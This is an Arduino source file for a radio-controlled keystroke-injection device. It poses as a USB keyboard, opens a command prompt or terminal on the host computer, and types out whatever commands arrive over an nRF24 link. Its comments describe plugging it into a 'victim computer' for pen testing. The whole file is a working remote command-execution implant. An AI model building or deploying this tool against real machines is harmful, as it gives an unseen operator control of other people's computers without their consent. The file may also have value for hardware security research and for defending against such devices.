#include <SPI.h>
#include <RF24.h>
#include <printf.h>   // must include this to use radio.printDetails();
#include <Keyboard.h>

#define CE_PIN 8
#define CSN_PIN 7


RF24 radio(CE_PIN, CSN_PIN);
const byte nodeAddresses[][6] = { {"Node1"} , {"Node2"}  };              // Radio pipe addresses for the 2 nodes to communicate.

const uint8_t channel = 0x76;
bool newLoad = false;
const int loadSize = 32;
byte payload[loadSize];
int rxCnt = 1;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//-------------------------------------KEYBOARD CONTROL------------------------------------------------------------------------//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
  
int defaultDelay = 4;
int defaultCharDelay = 5;

void typeKey(int key) {
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void windowsOpen(String app){
      delay(defaultDelay);
      delay(defaultDelay);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(114);
      Keyboard.releaseAll();

      delay(defaultDelay);
      delay(200);

      delay(defaultDelay);
      Keyboard.print(app);

      delay(defaultDelay);
      typeKey(KEY_RETURN);
      delay(100);
}

void openCMD(char OS) {
  Keyboard.begin();
  delay(500);
  delay(defaultDelay);
  switch (OS) {
    case 'W':
      windowsOpen("cmd");
    case 'L':    // Linux run dialog
      delay(defaultDelay);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(KEY_F2);
      Keyboard.releaseAll();

      delay(defaultDelay);
      delay(200);
      delay(defaultDelay);
      break;


    case 'M':    // Mac OS run dialog
      delay(defaultDelay);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' '); //cmd + N opens new terminal window, cmd + space opens spotlight search
      Keyboard.releaseAll();
      delay(600);
      Keyboard.print("Terminal");
      delay(200);
      typeKey(KEY_RETURN);
      Keyboard.releaseAll();
      delay(defaultDelay);
      delay(200);
      break;
  }

}



void executeCommands() {
  delay(200);
  String com = String((char*)payload);
  memset(payload, 0, loadSize);
  int i = 0;
  while (com[i] != '\0'){
    Keyboard.write(com[i]);
    ++i;
  }  
  com = "";
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//-------------------------------------nRF24 -----------------------------------------------------------------------------------//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

void radioConnect() {
  radio.setPALevel(RF24_PA_HIGH);           // RF24_PA_MIN ,RF24_PA_LOW, RF24_PA_HIGH, RF24_PA_MAX
  radio.setDataRate( RF24_1MBPS );      // RF24_250KBPS, RF24_1MBPS, RF24_2MBPS NOTE: NRF24L01 does not support 250KBPS, only the NRF24(+) does that, all the ones we have are (+) modules except the rf micros
  radio.setChannel(channel);        //channel and address are not the same!!! Channel is 1MHz bands from 2.4-2.56GHz
  radio.enableAckPayload();  // Allow optional ack payloads
  radio.enableDynamicPayloads();
  //radio.setRetries(3, 10);                // Smallest time between retries, max no. of retries

  radio.openWritingPipe(nodeAddresses[1]);   //this nodes writing pipe corresponds to the other nodes reading pipe! in this sketch, rx never uses its writing pipe
  radio.openReadingPipe(1, nodeAddresses[0]);   //same with reading pipe
  
}



void readAndReply() {
  radio.writeAckPayload(1, &rxCnt, sizeof(int));
  // check for radio message and send confirm using auto-ack, note you do not need to close your reading pipe/open writing to send an ack
  if ( radio.available() ) {
    radio.read( &payload, sizeof(payload) );
    //radio.writeAckPayload(1, &remoteNodeData, sizeof(remoteNodeData));
    rxCnt++;
    //Serial.println("Received request from master - sending preloaded data.");
    newLoad = true;
    delay(10);
  }
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//-------------------------------------RUNTIME--------------------------------------------------------------------------------//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

void setup() {
  openCMD('W');
  //Serial.begin(115200);
  //while (!Serial);                            //Will skip first few print statements on rfMicro or 32u4 if you do not have this, but if you dont open serial monitor then this hangs, 
                                                //i.e. do not want it when plugging into victim computer pen testing, but helpful for debugging if you  need print statement
  //printf_begin();          // This is for initializing printf that is used by printDetails()
  
  radio.begin();                           // Setup and configure rf radio
  radioConnect();
  //radio.printDetails();                   // Dump the configuration of the rf unit for debugging
  //Serial.println("connecting................");
  delay(500);
  radio.startListening();
  

  //delay(500);
  
}



void loop() {

  readAndReply();
  if (newLoad) {
    radio.stopListening();
    executeCommands();
    newLoad = false;
    radio.startListening();
  }
}
